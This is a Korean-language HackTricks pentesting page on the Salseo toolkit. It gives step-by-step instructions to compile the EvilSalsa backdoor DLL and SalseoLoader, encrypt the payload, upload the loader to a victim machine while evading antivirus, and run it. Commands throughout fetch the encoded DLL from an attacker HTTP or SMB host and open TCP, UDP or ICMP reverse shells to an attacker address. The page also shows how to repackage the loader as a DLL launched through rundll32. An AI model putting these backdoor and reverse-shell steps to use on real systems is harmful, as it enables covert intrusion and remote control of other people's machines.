# Salseo

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## 바이너리 컴파일

github에서 소스 코드를 다운로드하고 **EvilSalsa**와 **SalseoLoader**를 컴파일합니다. 코드를 컴파일하려면 **Visual Studio**가 설치되어 있어야 합니다.

사용할 윈도우 박스의 아키텍처에 맞게 프로젝트를 컴파일합니다(윈도우가 x64를 지원하면 해당 아키텍처로 컴파일합니다).

**Visual Studio**의 **왼쪽 "Build" 탭**에서 **"Platform Target"**을 통해 **아키텍처를 선택**할 수 있습니다.

(\*\*이 옵션을 찾을 수 없으면 **"Project Tab"**을 클릭한 다음 **"\<Project Name> Properties"**를 클릭하세요)

![](<../.gitbook/assets/image (839).png>)

그런 다음 두 프로젝트를 빌드합니다 (Build -> Build Solution) (로그 안에 실행 파일의 경로가 나타납니다):

![](<../.gitbook/assets/image (381).png>)

## 백도어 준비

우선, **EvilSalsa.dll**을 인코딩해야 합니다. 이를 위해 **encrypterassembly.py**라는 파이썬 스크립트를 사용하거나 **EncrypterAssembly** 프로젝트를 컴파일할 수 있습니다.

### **Python**
```
python EncrypterAssembly/encrypterassembly.py <FILE> <PASSWORD> <OUTPUT_FILE>
python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.dll.txt
```
### 윈도우
```
EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
```
알겠습니다. 이제 모든 Salseo 작업을 실행하는 데 필요한 모든 것이 있습니다: **인코딩된 EvilDalsa.dll**과 **SalseoLoader의 바이너리.**

**SalseoLoader.exe 바이너리를 머신에 업로드하세요. 어떤 AV에도 탐지되지 않아야 합니다...**

## **백도어 실행**

### **TCP 리버스 셸 얻기 (HTTP를 통해 인코딩된 dll 다운로드)**

nc를 리버스 셸 리스너로 시작하고 인코딩된 evilsalsa를 제공할 HTTP 서버를 시작하는 것을 잊지 마세요.
```
SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
```
### **UDP 리버스 셸 얻기 (SMB를 통한 인코딩된 dll 다운로드)**

리버스 셸 리스너로 nc를 시작하고, 인코딩된 evilsalsa를 제공하기 위해 SMB 서버를 시작하는 것을 잊지 마세요 (impacket-smbserver).
```
SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
```
### **ICMP 리버스 셸 얻기 (피해자 내부에 이미 인코딩된 dll)**

**이번에는 리버스 셸을 수신하기 위해 클라이언트에 특별한 도구가 필요합니다. 다운로드:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)

#### **ICMP 응답 비활성화:**
```
sysctl -w net.ipv4.icmp_echo_ignore_all=1

#You finish, you can enable it again running:
sysctl -w net.ipv4.icmp_echo_ignore_all=0
```
#### 클라이언트 실행:
```
python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
```
#### 피해자 내부에서, salseo 작업을 실행해 보겠습니다:
```
SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
```
## SalseoLoader를 DLL로 컴파일하여 메인 함수 내보내기

Visual Studio를 사용하여 SalseoLoader 프로젝트를 엽니다.

### 메인 함수 앞에 추가: \[DllExport]

![](<../.gitbook/assets/image (409).png>)

### 이 프로젝트에 DllExport 설치

#### **도구** --> **NuGet 패키지 관리자** --> **솔루션용 NuGet 패키지 관리...**

![](<../.gitbook/assets/image (881).png>)

#### **DllExport 패키지 검색 (탭에서 찾아보기 사용), 설치를 누르고 (팝업을 수락)**

![](<../.gitbook/assets/image (100).png>)

프로젝트 폴더에 **DllExport.bat** 및 **DllExport\_Configure.bat** 파일이 나타납니다.

### **U**ninstall DllExport

**Uninstall**을 누릅니다 (이상하게 들리지만 믿어주세요, 필요합니다)

![](<../.gitbook/assets/image (97).png>)

### **Visual Studio 종료 및 DllExport\_configure 실행**

그냥 **종료**합니다 Visual Studio

그런 다음, **SalseoLoader 폴더**로 가서 **DllExport\_Configure.bat**를 실행합니다.

**x64**를 선택합니다 (x64 박스 내에서 사용할 경우, 제 경우가 그랬습니다), **System.Runtime.InteropServices**를 선택합니다 ( **DllExport**의 **네임스페이스** 내에서) 그리고 **적용**을 누릅니다.

![](<../.gitbook/assets/image (882).png>)

### **Visual Studio로 프로젝트 다시 열기**

**\[DllExport]**는 더 이상 오류로 표시되지 않아야 합니다.

![](<../.gitbook/assets/image (670).png>)

### 솔루션 빌드

**출력 유형 = 클래스 라이브러리**를 선택합니다 (프로젝트 --> SalseoLoader 속성 --> 응용 프로그램 --> 출력 유형 = 클래스 라이브러리)

![](<../.gitbook/assets/image (847).png>)

**x64** **플랫폼**을 선택합니다 (프로젝트 --> SalseoLoader 속성 --> 빌드 --> 플랫폼 대상 = x64)

솔루션을 **빌드**하려면: 빌드 --> 솔루션 빌드 (출력 콘솔 내에 새 DLL의 경로가 나타납니다)

### 생성된 Dll 테스트

테스트할 위치에 Dll을 복사하고 붙여넣습니다.

실행:
```
rundll32.exe SalseoLoader.dll,main
```
오류가 나타나지 않으면, 아마도 기능하는 DLL이 있는 것입니다!!

## DLL을 사용하여 셸 얻기

**HTTP** **서버**를 사용하고 **nc** **리스너**를 설정하는 것을 잊지 마세요.

### Powershell
```
$env:pass="password"
$env:payload="http://10.2.0.5/evilsalsax64.dll.txt"
$env:lhost="10.2.0.5"
$env:lport="1337"
$env:shell="reversetcp"
rundll32.exe SalseoLoader.dll,main
```
### CMD
```
set pass=password
set payload=http://10.2.0.5/evilsalsax64.dll.txt
set lhost=10.2.0.5
set lport=1337
set shell=reversetcp
rundll32.exe SalseoLoader.dll,main
```
{% hint style="success" %}
AWS 해킹 배우기 및 연습하기:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP 해킹 배우기 및 연습하기: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks 지원하기</summary>

* [**구독 계획**](https://github.com/sponsors/carlospolop) 확인하기!
* **💬 [**디스코드 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 참여하거나 **트위터** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우하세요.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) 깃허브 리포지토리에 PR을 제출하여 해킹 트릭을 공유하세요.**

</details>
{% endhint %}
